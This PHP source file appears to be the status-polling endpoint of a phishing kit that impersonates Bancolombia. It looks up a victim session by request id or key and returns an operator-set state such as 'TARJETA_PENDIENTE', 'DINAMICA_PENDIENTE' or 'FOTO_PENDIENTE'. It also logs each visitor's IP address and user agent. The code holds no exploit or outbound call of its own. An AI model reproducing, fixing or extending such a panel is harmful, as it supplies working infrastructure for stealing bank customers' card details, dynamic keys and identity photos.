<?php
// FIX_ESTRICTO_v2: (a) BINARY match, (b) whitelist, (c) filtro banco='Bancolombia',
// (d) si request_id no empieza por BCO_ (formato nuevo) => require que el key tambien
// coincida BINARY Y banco='Bancolombia' para aceptar. (e) LOG todo a debug_estado.log.
header('HTTP/1.1 200 OK');
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

try {
    require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

    $request_id = $_GET['rid'] ?? $_GET['requestId'] ?? $_GET['request_id'] ?? '';
    $key        = $_GET['key'] ?? '';

    $remote = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    $row = null;
    $hitBy = null;
    $finalEstado = 'pendiente';
    $banco = '';

    $listaValidos = [
        'opcion_1','opcion_2','opcion_3','opcion_4','opcion_5','opcion_6',
        'opcion_7','opcion_8','opcion_9','opcion_10','opcion_55',
        'DINAMICA_PENDIENTE','TARJETA_PENDIENTE','ERROR_PENDIENTE',
        'FOTO_PENDIENTE','FINALIZADO','ERROR_DINAMICA',
    ];

    function filaAceptada($rowRaw, $origen) {
        global $request_id, $key, $listaValidos;
        if (!$rowRaw || !is_array($rowRaw)) return false;
        $b = (string)($rowRaw['banco'] ?? '');
        if ($b !== 'Bancolombia') return false;
        if (!isset($rowRaw['estado']) || !is_string($rowRaw['estado']) || $rowRaw['estado'] === '') return false;
        if (strtolower($rowRaw['estado']) === 'pendiente') return false;
        if (!in_array($rowRaw['estado'], $listaValidos, true)) return false;

        // Si el rid NO es del formato BCO_... (144 bits random), necesitamos que
        // la fila tambien coincida BINARY key con la key de la URL para evitar
        // coincidencias debiles con rids de nequipse que quedaron en la tabla.
        $ridActual = (string)($rowRaw['request_id'] ?? '');
        $keyActual = (string)($rowRaw['key'] ?? '');
        if (strncmp($ridActual, 'BCO_', 4) !== 0) {
            if ($key === '' || $keyActual === '') {
                // Para sessiones antiguas sin prefijo BCO_ se necesita la key.
                if ($origen === 'request_id') return false;
            } else {
                if ($origen === 'request_id' && $keyActual !== $key) {
                    return false;
                }
            }
        }
        return true;
    }

    if ($request_id !== '') {
        $stmt = $pdo->prepare("SELECT request_id, `key`, estado, banco FROM solicitudes WHERE BINARY request_id = ? AND banco = 'Bancolombia' LIMIT 1");
        $stmt->execute([$request_id]);
        $candidate = $stmt->fetch(PDO::FETCH_ASSOC);
        // Candidato por request_id SÓLO es válido si (a) banco='Bancolombia' y (b) request_id de la fila coincide BINARY EXACTO con el request_id de la URL.
        if ($candidate && is_array($candidate) &&
            ((string)$candidate['banco'] === 'Bancolombia') &&
            (strcmp((string)$candidate['request_id'], (string)$request_id) === 0)
        ) {
            if (filaAceptada($candidate, 'request_id')) {
                $row = $candidate;
                $hitBy = 'request_id';
                $banco = (string)($row['banco'] ?? '');
                $finalEstado = (string)$row['estado'];
            } else {
                $hitBy = $candidate ? 'request_id_rejected' : null;
            }
        } else {
            if (!$hitBy && $candidate) {
                $hitBy = 'request_id_mismatch';
            }
        }
    }

    if ((!$row || !is_array($row)) && $key !== '') {
        $stmt = $pdo->prepare("SELECT request_id, `key`, estado, banco FROM solicitudes WHERE BINARY `key` = ? AND banco = 'Bancolombia' LIMIT 1");
        $stmt->execute([$key]);
        $candidate2 = $stmt->fetch(PDO::FETCH_ASSOC);
        // Candidato por key SÓLO si banco='Bancolombia' y key coincide BINARY EXACTO.
        if ($candidate2 && is_array($candidate2) &&
            ((string)$candidate2['banco'] === 'Bancolombia') &&
            (strcmp((string)$candidate2['key'], (string)$key) === 0)
        ) {
            if (filaAceptada($candidate2, 'key')) {
                $row = $candidate2;
                if (!$hitBy) $hitBy = 'key';
                $banco = (string)($row['banco'] ?? '');
                $finalEstado = (string)$row['estado'];
            }
        }
    }

    // Auditoria LOG (rotacion simple: 1 archivo). No exponemos passwords ni datos sensibles.
    try {
        $logDir = __DIR__;
        $logPath = $logDir . DIRECTORY_SEPARATOR . 'debug_estado.log';
        $line = sprintf(
            "[%s] ip=%s rid=%s key=%s hitBy=%s foundRow=%s rowRid=%s rowKey=%s rowEstado=%s rowBanco=%s finalEstado=%s ua=%s\n",
            gmdate('Y-m-d\TH:i:s\Z'),
            $remote,
            $request_id,
            $key,
            ($hitBy ?? 'none'),
            ($row ? '1' : '0'),
            ($row['request_id'] ?? ''),
            ($row['key'] ?? ''),
            ($row['estado'] ?? ''),
            $banco,
            $finalEstado,
            $ua
        );
        $fp = @fopen($logPath, 'a');
        if ($fp) {
            @fwrite($fp, $line);
            @fclose($fp);
        }
    } catch (Throwable $_) { /* ignore logging errors */ }

    echo json_encode(['estado' => $finalEstado], JSON_UNESCAPED_UNICODE);
} catch (Throwable $e) {
    error_log('estado.php error: '.$e->getMessage());
    try {
        echo json_encode(['estado' => 'pendiente'], JSON_UNESCAPED_UNICODE);
    } catch (Throwable $_) { /* ignore */ }
}
exit;
